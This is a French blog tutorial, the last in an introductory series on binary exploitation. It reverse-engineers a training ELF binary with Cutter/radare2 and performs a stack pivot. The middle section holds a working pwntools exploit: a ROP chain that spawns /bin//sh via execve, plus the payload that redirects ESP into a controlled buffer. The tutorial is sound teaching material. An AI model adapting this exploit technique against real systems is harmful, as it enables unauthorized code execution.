---
author: "Laluka"
title: "PWN 4/4 : Stack Pivot ToZeMoon !"
slug: "pwn_4of4_stak_pivot_to_ze_moon"
date: 2018-05-10
status: "original"
description: "Les bases de l'exploitation binaires sont normalement acquises, c'est parti pour une exploitation pratique d'un stack pivot !"
---

 > Petit ajout après la publication des articles :

 > Ces quatres articles ont donné lieu à une conférence d'introduction au pwn à la HitchHack 2018. Elle résume les 3 premiers articles mais rentre moins dans le détail. Si ce format vous convient mieux, les slides sont téléchargables [ici](/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf) et la vidéo (francais uniquement) ici :

 {{< youtube hmt8M9YLwTg >}}

## Route du pwn, dernier article d'introduction !

Je vous avais promis du lourd pour le final, chose dite, chose due !

L'exploit ne sera pas très long, mais en prévision : Une technique sympa, du reverse, et un outil open source qui vend du rêve !

Vous qui avez tenu les 3 articles précédents, j'espère que vous êtes toujours chauds !

<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/lets_go.jpg" alt="lets_go" >


## Reconnaissance

Le binaire étudié est téléchargable [ici](/hacking/pwn_4of4_stack_pivot/vuln) !

Bonjour petit programme, que fais-tu dans la vie ?

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/recon.png" alt="recon" >

Meh, not much...

On sort le premier tool : Radare2 !

J'ai hésité entre le présenter en ligne de commande, ou via son interface graphique. Mais il y a tellement de développement et d'efforts faits sur leur GUI que je vais présenter cette version.

Je vous présente donc Cutter, basé sur radare2, qui est un outil de reverse engineering très pointu. Pour la petite histoire, radare2 est voulu le plus standalone (indépendant) possible, c'est à dire que vous pouvez l'utiliser sur un device / une architecture particulière, même si celle ci n'a pas le moindre outil / paquet préinstallé. Il vous suffit de le recompiler in situ ou le cross-compiler. En 'prime', plein de tools d'admin-sys classiques y sont intégrés ! Le paradis pour du embedded device, du remote sur un tel / une montre, ou que sais-je encore.

Il est open source, et son développement très actif, préférez donc une installation via leur git... :)

Site officiel ici : https://rada.re/r/

Il est bourré d'easter eggs, si vous avez du temps à perdre, enjoy ! ;)

Je sais que le screenshot est difficilement lisible en taille normal, mais j'ai mis la résolution source, et j'ai check sur tel et pc, en zoomant c'est pixel-perfect !

Deso / Pas deso, il faut voir plus gros ! `¯\_(ツ)_/¯`

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/cutter.png" alt="cutter" >

Présentation brève de l'interface :

 * A gauche :

Les différentes fonctions du programme. On a de la chance, le programme n'a pas été "strip", il contient donc encore le nom des fonctions. Sinon, nous n'aurions eu que des noms génériques peu agréables à utiliser.

 * A droite :

Des informations sur la ligne en cours d'inspection. Pas très utile pour le moment.

 * En haut :

Un apercu de la structure du programme. Code, données, schémas reconnaissables pour de la crypto, ...

 * En bas :

Une console de logs (avec déjà un easter egg !) et les différentes sections du programme et leurs infos.

 * Au milieu :

L'outil d'analyse en cours d'utilisation.

Ici, le dashboard nous indique fièrement : Ouiiii, alors j'ai un peu cherchéééé, et tu voisss, j'ai trouvé que ta cible là, eh bien c'est un ELF, en 32 bits, initialement codé en C, sans stack canary, sans protection cryptographique, sa stack est NX, le PIC est désactivé. Il n'est pas strippé, et il est compilé en statique ! :D

Si ce n'est pas classe toutes ces infos d'un claquement de doigt !

Du coup... Vous l'aver ? °^°

<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/ffs.jpg" alt="ffs" >

Petit apercu du flot d'exécution (à partir du main), toujours via Cutter :

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/graph_call.png" alt="graph_call" >

Un peu la flemme d'analyser ca en profondeur... Pseudo code s'il vous plaît ?

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pseudo_code.png" alt="pseudo_code" >

On voit tout de suite que la décompilation est partielle, on voit plein de choses intéressantes, mais on n'a pas un code C clair comme on aimerait... Bah on va faire avec !

Il y a de la matière, il est donc temps d'apprendre une manière de voir les choses très efficace pour le hacking en général : Sources and Sinks !

Petite ref à la chaine youtube de [LiveOverflow]( https://www.youtube.com/watch?v=ZaOtY4i5w_U), contenu de qualiteyyyy ! Tout ce qu'il fait (hacking, pwn, web, reverse, random, ...) est d'une qualité incroyable, et il a justement parlé de la méthode SoSi, donc faites y un tour !

En bref, que contrôlons-nous (inputs), et que voulons-nous atteindre (fonctions dangereuses).

Ici, on veut faire un buffer overflow. On cherche donc des fonctions vulnérables et des entrées.

 * Sources : admin name, room name, temperature

 * Sinks : scanf... scanf ? scanf !

scanf correspond à "room name". On fait un ou deux essais quand même pour être sûr de contrôler le point de crash :

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/crash.png" alt="crash" >

Point de crash confirmé !

Avant de chercher l'offset, il y a une chose supplémentaire à repérer, qui nous servira **PEUT ÊTREEEEE** par la suite... Je dis ca je dis rien... Pour les chercheurs, c'est dans le premier screenshot de code, pour les autres, la lecture continue :

*-[ SPOIL ]-*

On lit le code suivant :

```
push 0x3ff // taille : 1023
push obj.username // adresse : 0x80eb2c0 char * fgets(...) // saisie utilisateur
```

Autrement dit, le programme va toujours mettre au même endroit (0x80eb2c0) jusqu'à 1023 bytes saisis par l'utilisateur... Ca peut se justifier... Mais ca peut être utile non ? Who knows ! :)

Maintenant, l'offset !

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_create.png" alt="pattern_create" >

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_search.png" alt="pattern_search" >

On crash sur un ret : Habituel, classique, cool.

On a ESP, bien. Wait... What ? On a ESP... + 4 ?

Eh oui, le fameux pattern est suffisamment bien pensé pour être détecté même si il a été altéré (un peu) !

Cela signifie qu'entre le moment où on overflow, et le moment où on exécute l'instruction ret, la pile (enfin, notre ESP dans la pile) a été altéré.

Mais... On a ESP + 4 ? Oui. On sait faire une addition ? Oui.

<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/coincidence.gif" alt="coincidence" >

Vous commencez, je l'espère, à voir où je veux en venir ? :)

On sait où stocker des bytes. On contrôle EIP vu qu'on contrôle ESP sur un ret. On connaît l'offset, et on sait comment modifier ESP pour qu'il prenne la valeur de notre choix... Yapluka !

C'est là que je nomme la technique que nous allons utiliser, le Stack Pivot !

On va faire pivoter l'exécution de notre programme, en lui faisant croire que la stack est à l'emplacement du username, que nous pouvons définir à notre guise, bien entendu.

Je passe la préparation de la ropchain car c'est exactement comme dans l'article précédent, on va tout de suite faire notre exploit :

```python
#!/usr/bin/env python2

from pwn import *

# Setting up
context.log_level = "debug"

ropchain = ''
ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
ropchain += p32(0x080ea340)  # @ .data
ropchain += p32(0x080bb696)  # popayloadeax ; ret
ropchain += '/bin'
ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
ropchain += p32(0x41414141)  # padding
ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
ropchain += p32(0x080ea344)  # @ .data + 4
ropchain += p32(0x080bb696)  # popayloadeax ; ret
ropchain += '//sh'
ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
ropchain += p32(0x41414141)  # padding
ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
ropchain += p32(0x080ea348)  # @ .data + 8
ropchain += p32(0x080545b0)  # xor eax, eax ; ret
ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
ropchain += p32(0x41414141)  # padding
ropchain += p32(0x080481a9)  # popayloadebx ; ret
ropchain += p32(0x080ea340)  # @ .data
ropchain += p32(0x080c18cc)  # popayloadecx ; ret
ropchain += p32(0x080ea348)  # @ .data + 8
ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
ropchain += p32(0x080ea348)  # @ .data + 8
ropchain += p32(0x080545b0)  # xor eax, eax ; ret
ropchain += p32(0x0807b64f) * 11 # inc eax ; ret
ropchain += p32(0x080494b1)  # int 0x80

p = process("./vuln")
p.recv()
p.sendline(ropchain)
p.recv()
"""
0x08048fc9 <+397>:	lea    esp,[ecx-0x4]
0x08048fcc <+400>:	ret
On ajoute donc 4 a user name pour compenser le -0x4
"""
usernameAddr = 0x80EB2C0
ESP = usernameAddr + 4 # Fix the offset before ret
p.sendline("1" * 28 + p32(ESP))
p.recv()
p.sendline("10")
p.recv()
p.interactive()
```

On le lance, ce serait quand même fou que ca fonctionne du premier coup non ? :O

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/run_exploit.png" alt="run_exploit" >

Bim, shell, first try, too IZI mannnn !

<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/like_a_boss.jpg" alt="like_a_boss" >

Sauf que... Sauf que non.

En lisant un article comme ca, ca n'a pas l'air si complexe que ca, un peu fouilli à la rigueur. Sauf que pour chaque exploit, à moins d'être vraiment un monstre (coucou Geluchat, Blackndoor, Pixis, Klaoude, Antoxyde, Ethnical, ...), c'est des heures, des jours (enfin, nuits, on se comprend ;) ) qui y passent. Mais s'acharner pendant longtemps pour finalement y arriver, quelle satisfaction !

Si vous aussi vous souhaitez vous lancer, je vous conseille l'excellente suite d'exercice [Protostar](https://exploit-exercises.com/protostar/).

Ainsi que le classique [root-me](https://www.root-me.org/) que j'affectionne particulièrement. Faites quand même attention, ce site dévorera vos nuits... =]

Mais bien que j'adore ce site, je ne le trouve pas très approprié pour découvrir l'exploit binaire. Mais pour toutes les autres catégories de hacking "classique", foncez, c'est du pain béni ! ;)

C'est ainsi que se conclu cette introduction au pwn, j'espère qu'elle vous a plu et que vous y avez appris des choses (au moins un peu ? :D )

Vos nombreux retours me font très très plaisir ! ^.^

En vous souhaitant un pwn heureux et fructueux,
